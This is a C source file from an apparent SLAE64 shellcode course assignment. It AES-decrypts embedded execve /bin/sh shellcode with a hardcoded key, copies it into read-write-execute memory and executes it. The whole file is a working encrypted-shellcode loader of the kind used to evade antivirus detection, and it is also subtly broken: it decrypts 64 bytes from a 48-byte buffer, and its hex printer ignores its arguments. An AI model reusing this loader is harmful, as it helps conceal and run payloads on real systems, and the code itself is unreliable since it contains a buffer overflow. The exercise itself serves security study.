// Student ID     : SLAE64-1611
// Student Name   : Jonathan "Chops" Crosby
// Assignment 7   : Custom Decrypter
// File Name      : decrypter.c
// Derived From   : https://github.com/kokke/tiny-AES-c

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"


//encrypted shellcode for execve for /bin/sh
uint8_t shellcode[] = {0x70, 0x95, 0xac, 0x47, 0xd5, 0x0e, 0xad, 0x82,
                       0x1a, 0xfb, 0xb0, 0x41, 0xc7, 0x36, 0x8e, 0xef,
                       0x5a, 0x15, 0xa7, 0x7c, 0x5c, 0xda, 0x5e, 0x18,
                       0xd8, 0x89, 0xbc, 0x4d, 0x7c, 0x0b, 0xe7, 0xd1,
                       0x77, 0x07, 0xd2, 0x15, 0xde, 0x6f, 0x1a, 0xe8,
                       0xbe, 0x2f, 0xfa, 0xb3, 0x57, 0xc5, 0x8d, 0xe2 };

static void decrypt_cbc(void)
{
    //w00t...
    uint8_t key[] = { 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74 };

    //w00tw00tw00tw00t
    uint8_t iv[]  = { 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74 };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, 64);

    putchar('\n');
}

void showHex(uint8_t* shellin, size_t size)
{
    int i;
    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\0x%02x", shellcode[i]);
    }
}

int main(void)
{

   int shellcodeSize = (sizeof(shellcode)-1);

    printf("\n\nEncrypted Shellcode:\n");
    printf("--------------------\n");
    showHex(shellcode, shellcodeSize);

    decrypt_cbc();

    printf("\n\nDecrypted Shellcode:\n");
    printf("--------------------\n");
    showHex(shellcode, shellcodeSize);

    printf("\n\nExecuting Shellcode Now!\n");
    printf("--------------------\n");

    void *executeMe;

    executeMe = mmap(0, shellcodeSize, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON  | MAP_PRIVATE, -1, 0);

    memcpy(executeMe, &shellcode, shellcodeSize);

    ((void(*)())executeMe)();

    //int (*ret)() = (int(*)())shellcode;

    //ret();

    return 0;
}
